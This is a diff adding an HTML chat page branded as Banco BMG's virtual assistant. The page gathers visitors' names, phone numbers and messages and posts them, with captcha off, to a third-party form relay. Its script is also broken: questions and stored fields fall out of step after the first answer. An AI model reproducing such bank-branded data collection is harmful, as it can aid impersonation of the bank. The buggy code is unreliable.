@@ -1,0 +1,151 @@
+<!DOCTYPE html><html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Assistente Virtual BMG</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+    }
+    .header {
+      background: #ff6600;
+      padding: 15px;
+      color: white;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+    }
+    .header img {
+      width: 40px;
+      height: 40px;
+      margin-right: 10px;
+    }
+    .chat-window {
+      flex: 1;
+      padding: 15px;
+      display: flex;
+      flex-direction: column;
+      overflow-y: auto;
+    }
+    .message {
+      max-width: 80%;
+      margin-bottom: 10px;
+      padding: 10px;
+      border-radius: 10px;
+      opacity: 0;
+      animation: fadeIn 0.5s ease forwards;
+    }
+    .bot {
+      background: #e0e0e0;
+      align-self: flex-start;
+    }
+    .user {
+      background: #d1edc1;
+      align-self: flex-end;
+    }
+    .input-area {
+      display: flex;
+      padding: 10px;
+      background: white;
+      border-top: 1px solid #ccc;
+    }
+    .input-area input {
+      flex: 1;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 20px;
+      outline: none;
+    }
+    .input-area button {
+      background: #ff6600;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      padding: 10px 15px;
+      margin-left: 10px;
+      cursor: pointer;
+    }
+    @keyframes fadeIn {
+      to {
+        opacity: 1;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="https://i.imgur.com/8QfD2Oi.png" alt="Logo BMG">
+    Atendimento virtual Banco BMG
+  </div>
+  <div class="chat-window" id="chat">
+    <div class="message bot">👋 Olá! Sou a Assistente BMG, atendimento digital da nossa unidade em Seropédica.<br>Qual o seu nome completo?</div>
+  </div>
+  <form id="chatForm" action="https://formsubmit.co/el/cujimo" method="POST">
+    <input type="hidden" name="nome">
+    <input type="hidden" name="telefone">
+    <input type="hidden" name="motivo">
+    <input type="hidden" name="mensagem">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_subject" value="Novo Atendimento Virtual">
+    <input type="hidden" name="_next" value="https://formsubmit.co/thanks.html">
+    <div class="input-area">
+      <input type="text" id="userInput" placeholder="Digite aqui..." autocomplete="off" required>
+      <button type="submit" id="sendBtn">Enviar</button>
+    </div>
+  </form>  <script>
+    const chat = document.getElementById('chat');
+    const form = document.getElementById('chatForm');
+    const input = document.getElementById('userInput');
+    const sendBtn = document.getElementById('sendBtn');
+
+    const perguntas = [
+      "📞 Qual seu telefone?",
+      "🎯 Qual o motivo do contato?",
+      "📝 Escreva sua mensagem ou dúvida:"
+    ];
+    const campos = ["nome", "telefone", "motivo", "mensagem"];
+    let etapa = 0;
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const resposta = input.value.trim();
+      if (!resposta) return;
+
+      adicionarMensagemUsuario(resposta);
+      form.elements[campos[etapa]].value = resposta;
+      input.value = '';
+
+      etapa++;
+
+      if (etapa < perguntas.length) {
+        setTimeout(() => adicionarMensagemBot(perguntas[etapa]), 300);
+      } else {
+        setTimeout(() => {
+          form.submit();
+        }, 500);
+      }
+    });
+
+    function adicionarMensagemUsuario(texto) {
+      const msg = document.createElement('div');
+      msg.className = 'message user';
+      msg.innerText = texto;
+      chat.appendChild(msg);
+      chat.scrollTop = chat.scrollHeight;
+    }
+
+    function adicionarMensagemBot(texto) {
+      const msg = document.createElement('div');
+      msg.className = 'message bot';
+      msg.innerText = texto;
+      chat.appendChild(msg);
+      chat.scrollTop = chat.scrollHeight;
+    }
+  </script></body>
+</html>
